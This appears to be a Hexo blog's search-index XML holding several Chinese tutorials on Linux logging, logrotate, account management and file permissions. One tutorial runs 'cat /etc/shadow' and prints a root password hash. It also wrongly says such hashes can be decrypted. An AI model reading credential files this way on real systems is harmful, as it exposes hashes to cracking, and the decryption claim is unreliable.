强制轮循&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即使轮循条件没有满足，我们也可以通过使用‘-f’选项来强制logrotate轮循日志文件，‘-v’参数提供了详细的输出。 1234567891011121314151617181920212223242526# logrotate -vf /etc/logrotate.d/log-filereading config file /etc/logrotate.d/log-file reading config info for /var/log/log-file Handling 1 logs rotating pattern: /var/log/log-file forced from command line (5 rotations) empty log files are rotated, old logs are removed considering log /var/log/log-file log needs rotating rotating log /var/log/log-file, log-&gt;rotateCount is 5 dateext suffix '-20140916' glob pattern '-[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]' renaming /var/log/log-file.5.gz to /var/log/log-file.6.gz (rotatecount 5, logstart 1, i 5), old log /var/log/log-file.5.gz does not exist renaming /var/log/log-file.4.gz to /var/log/log-file.5.gz (rotatecount 5, logstart 1, i 4), old log /var/log/log-file.4.gz does not exist . . . renaming /var/log/log-file.0.gz to /var/log/log-file.1.gz (rotatecount 5, logstart 1, i 0), old log /var/log/log-file.0.gz does not exist log /var/log/log-file.6.gz doesn't exist -- won't try to dispose of it renaming /var/log/log-file to /var/log/log-file.1 creating new /var/log/log-file mode = 0644 uid = 0 gid = 0 running postrotate script compressing log with: /bin/gzip 4. Logrotate的记录日志&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;logrotate自身的日志通常存放于/var/lib/logrotate/status目录。如果处于排障目的，我们想要logrotate记录到任何指定的文件，我们可以指定像下面这样从命令行指定。 1# logrotate -vf –s /var/log/logrotate-status /etc/logrotate.d/log-file 5. Logrotate定时任务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;logrotate需要的cron任务应该在安装时就自动创建了，我把cron文件的内容贴出来，以供大家参考。 12345678910111213141516# cat /etc/cron.daily/logrotate#!/bin/sh # Clean non existent log file entries from status file cd /var/lib/logrotate test -e status || touch status head -1 status &gt; status.clean sed 's/"//g' status | while read logfile date do [ -e "$logfile" ] &amp;&amp; echo "\"$logfile\" $date" done &gt;&gt; status.clean mv status.clean status test -x /usr/sbin/logrotate || exit 0 /usr/sbin/logrotate /etc/logrotate.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;小结一下，logrotate工具对于防止因庞大的日志文件而耗尽存储空间是十分有用的。配置完毕后，进程是全自动的，可以长时间在不需要人为干预下运行。本教程重点关注几个使用logrotate的几个基本样例，你也可以定制它以满足你的需求。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统日志]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F65.%20Linux%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%2F</url>
    <content type="text"><![CDATA[Linux系统日志&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;日志重要吗？必须的，没有日志我们怎么知道系统状况？没有日志如何排查一个trouble？日志记录了系统每天发生的各种各样的事情，你可以通过他来检查错误发生的原因，或者受到攻击时攻击者留下的痕迹。日志主要的功能有：审计和监测，还可以实时的监测系统状态，监测和追踪侵入者等等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置文件 /etc/rsyslog.conf 。CentOS默认改为 rsyslog.conf 之前版本是 syslog.conf 。该配置文件主要信息为：记录哪些服务和需要记录什么等级的信息。 日志格式： auth -pam生产的日志 authpriv -ssh，ftp 等登录信息的验证信息 cron -时间任务相关 kern -内核 lpr -打印 mail -邮件 mark(syslog) -rsyslog服务内部的信息，时间标识 news -新闻组 user -用户程序产生的相关信息 uucp -unix to unix copy，unix主机之间相关的通讯 local 1~7 -自定义的日志设备 日志级别： debug -有调试信息的，日志信息最多 info -一般信息的日志，最常用 notice -最具有重要性的普通条件的信息 warning -警告级别 err -错误级别，阻止某个功能或者模块不能正常工作的信息 crit -严重级别，阻止整个系统或者整个软件不能正常工作的信息 alert -需要立刻修改的信息 emerg -内核崩溃严重信息 none -什么都不记录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上到下，级别从低到高，记录的信息越来越少 连接符号： .: 表示大于等于xxx 级别的信息 .=: 表示等于xxx 级别的信息 .!: 表示在xxx 之外的等级的信息 /var/log/messages 核心系统日志文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个日志是linux 系统最核心的日志文件，假若某个服务没有定义日志，那么该服务产生的日志就会到这个文件中。该日志每周归档一次。它是核心系统日志文件，包含了系统启动时的引导消息，以及系统运行时的其他状态消息。IO错误、网络错误和其他系统错误都会记录到这个文件中。另外其他信息，比如某个人的身份切换为root以及用户自定义安装的软件（apache）的日志也会在这里列出。通常，/var/log/messages是在做故障诊断时首先要查看的文件。系统有一个日志轮询的机制，每星期切换一个日志，变成message.xxxxxxxx, message.xxxxxxxx, … messages.xxxxxxxx 连同messages一共有5个这样的日志文件。这里的xxxxxxxx就是按照日期的格式生成的文件，在CentOS5里，这个后缀并不是日期而是数字1,2,3,4. 这是通过logrotate工具的控制来实现的 1234[root@localhost ~]# ls /var/log/messages*/var/log/messages /var/log/messages-20161016.1 /var/log/messages-20161120/var/log/messages-20161010.1 /var/log/messages-20161016.bak /var/log/messages-20161129/var/log/messages-20161010.bak /var/log/messages-20161114 /var/log/messages-20161204 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它的配置文件是/etc/logrotate.conf如果没有特殊需求请不要修改这个配置文件。 123456789101112131415161718192021222324252627282930313233343536[root@localhost ~]# cat /etc/logrotate.conf# see "man logrotate" for details# rotate log files weeklyweekly # keep 4 weeks worth of backlogsrotate 4 # create new (empty) log files after rotating old onescreate # use date as a suffix of the rotated filedateext # uncomment this if you want your log files compressed#compress # RPM packages drop log rotation information into this directoryinclude /etc/logrotate.d # no packages own wtmp and btmp -- we'll rotate them here/var/log/wtmp &#123; monthly create 0664 root utmp minsize 1M rotate 1&#125; /var/log/btmp &#123; missingok monthly create 0600 root utmp rotate 1&#125; # system-specific logs may be also be configured here. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/var/log/messages是由syslogd这个守护进程产生的，如果停掉这个服务则系统不会产生/var/log/messages，所以这个服务不要停。Syslogd服务的配置文件为/etc/syslog.conf这个文件定义了日志的级别，若没有特殊需求是不需要修改这个配置文件的，使用 man syslog.conf 获得更多关于它的信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了关注/var/log/messages外，还应该多关注一下 dmesg 这个命令，它可以显示系统的启动信息，如果某个硬件有问题（比如说网卡）用这个命令也是可以看到的。 1234567891011121314151617181920[root@localhost ~]# dmesg |lessInitializing cgroup subsys cpusetInitializing cgroup subsys cpuLinux version 2.6.32-220.el6.x86_64 (mockbuild@c6b18n3.bsys.dev.centos.org)(gcc version 4.4.6 20110731 (Red Hat 4.4.6-3) (GCC) ) #1 SMP Tue Dec 619:48:22 GMT 2011Command line: ro root=UUID=7912412b-3e66-401d-9ef5-3c2aba8dc737 rd_NO_LUKSKEYBOARDTYPE=pc KEYTABLE=us rd_NO_MD quiet rhgb crashkernel=autoLANG=zh_CN.UTF-8 rd_NO_LVM rd_NO_DMKERNEL supported cpus: Intel GenuineIntel AMD AuthenticAMD Centaur CentaurHaulsBIOS-provided physical RAM map:BIOS-e820: 0000000000000000 - 000000000009a400 (usable)BIOS-e820: 000000000009a400 - 00000000000a0000 (reserved)BIOS-e820: 00000000000d2000 - 00000000000d4000 (reserved)BIOS-e820: 00000000000e4000 - 0000000000100000 (reserved)BIOS-e820: 0000000000100000 - 00000000cff60000 (usable)BIOS-e820: 00000000cff60000 - 00000000cff69000 (ACPI data) 命令：last1234567891011[root@localhost ~]# last |headroot pts/0 192.168.0.207 Wed Jun 12 20:28 still logged inroot pts/1 192.168.0.207 Wed Jun 12 20:27 still logged inroot pts/0 192.168.0.161 Wed Jun 12 14:36 - 20:27 (05:50)root pts/0 192.168.0.161 Wed Jun 12 14:36 - 14:36 (00:00)root pts/0 192.168.0.207 Wed Jun 12 11:42 - 14:36 (02:54)root pts/0 192.168.0.207 Mon Jun 10 12:23 - 14:23 (02:00)root pts/0 192.168.0.70 Sat Jun 8 16:43 - 17:53 (01:09)root pts/0 192.168.0.70 Fri Jun 7 16:43 - 17:27 (00:44)root pts/0 192.168.0.70 Fri Jun 7 09:57 - 16:09 (06:11)root pts/0 192.168.0.70 Thu Jun 6 13:40 - 17:50 (04:09) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;last命令用来查看登录Linux历史信息，从左至右依次为账户名称、登录终端、登录客户端ip、登录日期及时长。last命令输出的信息实际上是读取了二进制日志文件/var/log/wtmp, 只是这个文件不能直接使用cat, vim, head, tail等工具查看。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外一个和登陆信息有关的日志文件为/var/log/secure, 该日志文件记录验证和授权等方面的信息，比如ssh登陆系统成功或者失败，都会把相关信息记录在这个日志里。 /var/log/wtmp日志用来查看用户登录历史，但这个文件不能直接cat查看，只能用last命令查看。 /var/log/btmp日志和wtmp类似，也不能直接cat查看，用命令lastb查看，记录无效登录历史。 /var/log/maillog是用来记录邮件相关的信息，比如发给谁邮件，是否发出去等信息。 /var/log/secure是一个安全认证相关的日志，比如系统用户登录时，正常登录或者登录失败都会记录，另外ftp服务相关的登录日志也会记录到这里来。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;dmesg这是一个命令，主要查看系统实时的硬件设备抛出的信息，如果磁盘异常或者网络异常或者内核异常都会记录下来。只不过这些信息是存到内存里的，系统重启后就消失了。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统日志及日志分析]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F67.%20Linux%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E5%8F%8A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Linux系统日志及日志分析&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;大部分Linux发行版默认的日志守护进程为 syslog，位于 /etc/syslog 或 /etc/syslogd，默认配置文件为 /etc/syslog.conf，任何希望生成日志的程序都可以向 syslog 发送信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统内核和许多程序会产生各种错误信息、警告信息和其他的提示信息，这些信息对管理员了解系统的运行状态是非常有用的，所以应该把它们写到日志文件中去。完成这个过程的程序就是syslog。syslog可以根据日志的类别和优先级将日志保存到不同的文件中。例如，为了方便查阅，可以把内核信息与其他信息分开，单独保存到一个独立的日志文件中。默认配置下，日志文件通常都保存在“/var/log”目录下。 日志类型&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面是常见的日志类型，但并不是所有的Linux发行版都包含这些类型： 类型 说明 auth 用户认证时产生的日志，如login命令、su命令。 authpriv 与 auth 类似，但是只能被特定用户查看。 console 针对系统控制台的消息。 cron 系统定期执行计划任务时产生的日志。 daemon 某些守护进程产生的日志。 ftp FTP服务。 kern 系统内核消息。 local0.local7 由自定义程序使用。 lpr 与打印机活动有关。 mail 邮件日志。 mark 产生时间戳。系统每隔一段时间向日志文件中输出当前时间，每行的格式类似于 May 26 11:17:09 rs2 – MARK –，可以由此推断系统发生故障的大概时间。 news 网络新闻传输协议(nntp)产生的消息。 ntp 网络时间协议(ntp)产生的消息。 user 用户进程。uucpUUCP子系统。 日志优先级&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常见的日志优先级请见下标： 优先级 说明 emerg 紧急情况，系统不可用（例如系统崩溃），一般会通知所有用户。 alert 需要立即修复，例如系统数据库损坏。 crit 危险情况，例如硬盘错误，可能会阻碍程序的部分功能。 err 一般错误消息。 warning 警告。 notice 不是错误，但是可能需要处理。 info 通用性消息，一般用来提供有用信息。 debug 调试程序产生的信息。 none 没有优先级，不记录任何日志消息。 常见日志文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所有的系统应用都会在 /var/log 目录下创建日志文件，或创建子目录再创建日志文件。例如： 文件/目录 说明/ var/log/boot.log 开启或重启日志。 /var/log/cron 计划任务日志 /var/log/maillog 邮件日志。 /var/log/messages 该日志文件是许多进程日志文件的汇总，从该文件可以看出任何入侵企图或成功的入侵。 /var/log/httpd 目录 Apache HTTP 服务日志。 /var/log/samba 目录 samba 软件日志 /etc/syslog.conf 文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/syslog.conf 是 syslog 的配置文件，会根据日志类型和优先级来决定将日志保存到何处。典型的 syslog.conf 文件格式如下所示： 123456789101112*.err;kern.debug;auth.notice /dev/consoledaemon,auth.notice /var/log/messageslpr.info /var/log/lpr.logmail.* /var/log/mail.logftp.* /var/log/ftp.logauth.* @see.xidian.edu.cnauth.* root,amroodnetinfo.err /var/log/netinfo.loginstall.* /var/log/install.log*.emerg **.alert |program_namemark.* /dev/console &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一列为日志类型和日志优先级的组合，每个类型和优先级的组合称为一个选择器；后面一列为保存日志的文件、服务器，或输出日志的终端。syslog 进程根据选择器决定如何操作日志。 对配置文件的几点说明： 日志类型和优先级由点号(.)分开，例如 kern.debug 表示由内核产生的调试信息。 kern.debug 的优先级大于 debug。 星号(*)表示所有，例如 *.debug 表示所有类型的调试信息，kern.* 表示由内核产生的所有消息。 可以使用逗号(,)分隔多个日志类型，使用分号(;)分隔多个选择器。 对日志的操作包括： 将日志输出到文件，例如 /var/log/maillog 或 /dev/console。 将消息发送给用户，多个用户用逗号(,)分隔，例如 root, amrood。 通过管道将消息发送给用户程序，注意程序要放在管道符(|)后面。 将消息发送给其他主机上的 syslog 进程，这时 /etc/syslog.conf 文件后面一列为以@开头的主机名，例如@see.xidian.edu.cn。 logger 命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;logger 是Shell命令，可以通过该命令使用 syslog 的系统日志模块，还可以从命令行直接向系统日志文件写入一行信息。 logger命令的语法为：1logger [-i] [-f filename] [-p priority] [-t tag] [message...] 每个选项的含义如下： 选项 说明 -f filename 将 filename 文件的内容作为日志。 -i 每行都记录 logger 进程的ID。 -p priority 指定优先级；优先级必须是形如 facility.priority 的完整的选择器，默认优先级为 user.notice。 -t tag 使用指定的标签标记每一个记录行。 message 要写入的日志内容，多条日志以空格为分隔；如果没有指定日志内容，并且 -f filename 选项为空，那么会把标准输入作为日志内容。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，将ping命令的结果写入日志： 12345678910111213$ ping 192.168.0.1 | logger -it logger_test -p local3.notice&amp;$ tail -f /var/log/userlogOct 6 12:48:43 kevein logger_test[22484]: PING 192.168.0.1 (192.168.0.1) 56(84) bytes of data.Oct 6 12:48:43 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=1 ttl=253 time=49.7 msOct 6 12:48:44 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=2 ttl=253 time=68.4 msOct 6 12:48:45 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=3 ttl=253 time=315 msOct 6 12:48:46 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=4 ttl=253 time=279 msOct 6 12:48:47 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=5 ttl=253 time=347 msOct 6 12:48:49 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=6 ttl=253 time=701 msOct 6 12:48:50 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=7 ttl=253 time=591 msOct 6 12:48:51 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=8 ttl=253 time=592 msOct 6 12:48:52 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=9 ttl=253 time=611 msOct 6 12:48:53 kevein logger_test[22484]: 64 bytes from 192.168.0.1: icmp_seq=10 ttl=253 time=931 ms &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ping命令的结果成功输出到 /var/log/userlog 文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 logger -it logger_test -p local3.notice 各选项的含义： -i：在每行都记录进程ID； -t logger_test：每行记录都加上“logger_test”这个标签； -p local3.notice：设置日志类型和优先级。 日志转储&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;日志转储也叫日志回卷或日志轮转。Linux中的日志通常增长很快，会占用大量硬盘空间，需要在日志文件达到指定大小时分开存储。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;syslog 只负责接收日志并保存到相应的文件，但不会对日志文件进行管理，因此经常会造成日志文件过大，尤其是WEB服务器，轻易就能超过1G，给检索带来困难。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;大多数Linux发行版使用 logrotate 或 newsyslog 对日志进行管理。logrotate 程序不但可以压缩日志文件，减少存储空间，还可以将日志发送到指定 E-mail，方便管理员及时查看日志。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，规定邮件日志 /var/log/maillog 超过1G时转储，每周一次，那么每隔一周 logrotate 进程就会检查 /var/log/maillog 文件的大小： 如果没有超过1G，不进行任何操作。 如果在1G~2G之间，就会创建新文件 /var/log/maillog.1，并将多出的1G日志转移到该文件，以给 /var/log/maillog 文件瘦身。 如果在2G~3G之间，会继续创建新文件 /var/log/maillog.2，并将 /var/log/maillog.1 的内容转移到该文件，将 /var/log/maillog 的内容转移到 /var/log/maillog.1，以保持 /var/log/maillog 文件不超过1G。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看到，每次转存都会创建一个新文件（如果不存在），命名格式为日志文件名加一个数字（从1开始自动增长），以保持当前日志文件和转存后的日志文件不超过指定大小。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;logrotate 的主要配置文件是 /etc/logrotate.conf，/etc/logrotate.d 目录是对 /etc/logrotate.conf 的补充，或者说为了不使 /etc/logrotate.conf 过大而设置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以通过 cat 命令查看它的内容： 123456789101112131415161718$cat /etc/logrotate.conf# see "man logrotate" for details //可以查看帮助文档# rotate log files weeklyweekly //设置每周转储一次# keep 4 weeks worth of backlogsrotate 4 //最多转储4次# create new (empty) log files after rotating old onescreate //当转储后文件不存储时创建它# uncomment this if you want your log files compressed#compress //以压缩方式转储# RPM packages drop log rotation information into this directoryinclude /etc/logrotate.d //其他日志文件的转储方式，包含在该目录下# no packages own wtmp -- we'll rotate them here/var/log/wtmp &#123; //设置/var/log/wtmp日志文件的转储参数 monthly //每月转储 create 0664 root utmp //转储后文件不存在时创建它，文件所有者为root，所属组为utmp，对应的权限为0664 rotate 1 //最多转储一次&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：include 允许管理员把多个分散的文件集中到一个，类似于C语言的 #include，将其他文件的内容包含进当前文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;include 非常有用，一些程序会把转储日志的配置文件放在 /etc/logrotate.d 目录，这些配置文件会覆盖或增加 /etc/logrotate.conf 的配置项，如果没有指定相关配置，那么采用 /etc/logrotate.conf 的默认配置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，建议将 /etc/logrotate.conf 作为默认配置文件，第三方程序在 /etc/logrotate.d 目录下自定义配置文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;logrotate 也可以作为命令直接运行来修改配置文件。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 密码文件]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F7.%20Linux%20%E5%AF%86%E7%A0%81%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Linux 密码文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;密码文件 /etc/shadow 和 ·/etc/passwd·，类似，都是 Linux 系统最重要的文件之一，用 ： 分割成9个字段。 1234[root@localhost ~]# cat /etc/shadow |head -n 3root:$6$Wo0kPkgm$OAp0Wl2AsaE4ei4YVbxo3DIU5OBSYxn1y7qxB5Jns70Yk91AvzElsR5GmoGCC8DUXkKzK7vyiV8wXNeaWNm861:15832:0:99999:7:::bin:*:15628:0:99999:7:::daemon:*:15628:0:99999:7::: 每个字段的含义1. 用户名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;跟 /etc/passwd 对应。 2. 用户密码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个才是该帐号真正的密码，不过这个密码已经加密了，但是还是能够解密的。所以该文件属性设置为000，但是 root 账户是可以访问或更改的。 12[root@localhost ~]# ls -l /etc/shadow---------- 1 root root 719 5月 10 09:02 /etc/shadow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;root的密码很长，通常以 $6$ 开头；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“*” 表示账户被 锁定&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“!!” 账户还没有密码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：CentOS 的加密方式就是 sha-512。 $6$ 开头是 sha-512 ；$5$ 开头是 sha-256 ；$1$ 表明是用 MD5 加密。 3. 上次更改密码的日期&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个数字的计算是，距离1970年1月1日到上次更改密码的日期，单位是天。例如上次更改密码的日期为2012年1月1日，则这个值就是 ‘365×(2012-1970)+(2012-1970)÷4+1 = 15341’。因为如果是闰年，则有366天。 4. 要过多少天才可以可以更改密码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认是0，即不限制。 5. 密码多少天后到期&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即在多少天内必须更改密码，例如这里设置成30，则30天内必须更改一次密码，否则将不能登录系统，默认是99999，可以理解为永远不需要改。 6. 密码到期前的警告期限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若这个值设置成7，则表示当7天后密码过期时，系统就发出告警告诉用户，提醒用户他的密码将在7天后到期。 7. 帐号失效期限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以这样理解，如果设置这个值为3，则表示：密码已经到期，然而用户并没有在到期前修改密码，那么再过3天，则这个帐号就失效了，即锁定了。 8. 帐号的生命周期&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;跟第三段一样，是按距离1970年1月1日多少天算的。它表示的含义是，帐号在这个日期前可以使用，到期后帐号作废。 9. 作为保留用的&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;没有什么意义。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rsync错误二则、排错过程及解决办法]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F68.%20rsync%E9%94%99%E8%AF%AF%E4%BA%8C%E5%88%99%E3%80%81%E6%8E%92%E9%94%99%E8%BF%87%E7%A8%8B%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[rsync错误二则、排错过程及解决办法 12345678910111213141516171819202122#!/bin/bash##created by zhaopeiwu @ 2015-04-20#FOR control the size of error log of apachePATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin:/usr/local/apache2/bin:/usr/local/mysql/binexport PATHlog_path="/usr/local/apache2/logs/"log_size=`du -s $log_path/error_log|cut -f 1`if [ $log_size -gt 100000 ];then mv $log_path/error_log $log_path/error_log_`date +%Y%m%d`; touch $log_path/error_log;finum_del=`ls -t $log_path/error*|wc -l`if [ $num_del -gt 4 ];then ls -t $log_path/error*|tail -$[$num_del-2]|xargs -i rm -f &#123;&#125; 2 &gt; /dev/nullfiexit 0]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 增加删除用户]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F9.%20Linux%20%E5%A2%9E%E5%8A%A0%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7%2F</url>
    <content type="text"><![CDATA[Linux 增加删除用户1.增加用户&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令：useradd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语法： 1useradd [-u UID] [-g GID] [-d HOME] [-M] [-s] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参数： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-u：自定义UID &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-g：使其属于已经存在的某个组，后面可以分组 id ，也可以分组名 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-d：自定义用户的家目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-M：不建立家目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-s：自定义 shell &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;‘useradd’ 不加任何选项直接跟用户名，则会创建一个跟用户名同样名字的组。 12345[root@localhost ~]# useradd test10[root@localhost ~]# tail -n1 /etc/passwdtest10:x:500:503::/home/test10:/bin/bash[root@localhost ~]# tail -n1 /etc/grouptest10:x:503: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;‘-g’ 选项后面跟一个不存在的gid会报错，提示该组不存在。 12345678910[root@localhost ~]# useradd -u510 -g 513 -M -s /sbin/nologin user11useradd: group '513' does not exist[root@localhost ~]# useradd -u510 -g 502 -M -s /sbin/nologin user11[root@localhost ~]# useradd -u511 -g grptest1 user12[root@localhost ~]# tail -n2 /etc/passwduser11:x:510:502::/home/user11:/sbin/nologinuser12:x:511:502::/home/user12:/bin/bash[root@localhost ~]# tail -n2 /etc/groupgrptest1:x:502:test10:x:503: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;‘-M’ 选项加上后则不建立用户家目录，但是在/etc/passwd文件中仍然有这个字段。但是使用 ls /home/user11 查看一下会提示该目录不存在。所以 ‘-M’ 选项的作用只是不创建那个目录。 12[root@localhost ~]# ls /home/user11ls: 无法访问/home/user11: 没有那个文件或目录 2.删除账户&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令：useradd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语法： 1userdel [-r] username &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;‘-r’ 选项的作用只有一个，就是删除账户的时候连带账户的家目录一起删除。 12345678910[root@localhost ~]# ls -ld /home/user12drwx------ 3 user12 grptest1 4096 5月 11 07:12 /home/user12[root@localhost ~]# userdel user12[root@localhost ~]# ls -ld /home/user12drwx------ 3 511 grptest1 4096 5月 11 07:12 /home/user12[root@localhost ~]# ls -ld /home/test10/drwx------ 3 test10 test10 4096 5月 11 07:09 /home/test10/[root@localhost ~]# userdel -r test10[root@localhost ~]# ls -ld /home/test10/ls: 无法访问/home/test10/: 没有那个文件或目录]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 文件权限]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F5.%20Linux%20%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%2F</url>
    <content type="text"><![CDATA[Linux 文件权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个文件都有一个所有者, 表示该文件是谁创建的. 同时, 该文件还有一个组编号, 表示该文件所属的组, 一般为文件所有者所属的组. 如果是一个可执行文件, 那么在执行时, 一般该文件只拥有调用该文件的用户具有的权限. 而setuid, setgid 可以来改变这种设置. setuid、setgid、sticky bit 说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;setuid：用于二进制可执行文件，设置使文件在执行阶段具有文件所有者的权限。典型的文件是 /usr/bin/passwd ，它更改用户的密码时是会更改 /etc/passwd 和 /etc/shadow 等文件的，这些文件默认普通用户没有写权限。如果一般用户执行该文件，则在执行过程中，该文件可以获得 root 权限，从而可以更改用户的密码。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;setgid：用于目录，用户在该目录下创建的文件都拥有与该目录相同的属组。当作用在文件上时，作用和 suid 类似，让执行该文件的用户临时拥有属组的权限，目录被设置该位后，任何用户在此目录下创建的文件都具有和该目录所属的组相同的组。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sticky bit：该位可以理解为防删除位。一个文件是否可以被某用户删除，主要取决于该文件所属的组是否对该用户具有写权限。如果没有写权限，则这个目录下的所有文件都不能被删除，同时也不能添加新的文件。如果希望用户能够添加文件但同时不能删除文件，则可以对文件使用 sticky bit 位。设置该位后，就算用户对目录具有写权限，也不能删除该文件。 权限修改操作&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;操作这些标志与操作文件权限的命令是一样的，都是 chmod 。有两种方法来操作： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1. 如下 123chmod u+s temp -- 为temp文件加上setuid标志. (setuid 只对文件有效)chmod g+s tempdir -- 为tempdir目录加上setgid标志（可以作用在文件上，效果和suid类似，也可以作用在目录）chmod o+t tempdir -- 为tempdir目录加上sticky标志 (sticky只对目录有效) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2. 用八进制方式。对一般文件通过三组八进制数字来设置标志，如 666 ，777 ，644 等。如果设置这些特殊标志，则在这组数字之外外加一组八进制数字。如 4666 ， 2777 等。这一组八进制数字三围的意义如下： a - setuid 位，如果该位为 1，则表示设置 setuid b - setgid 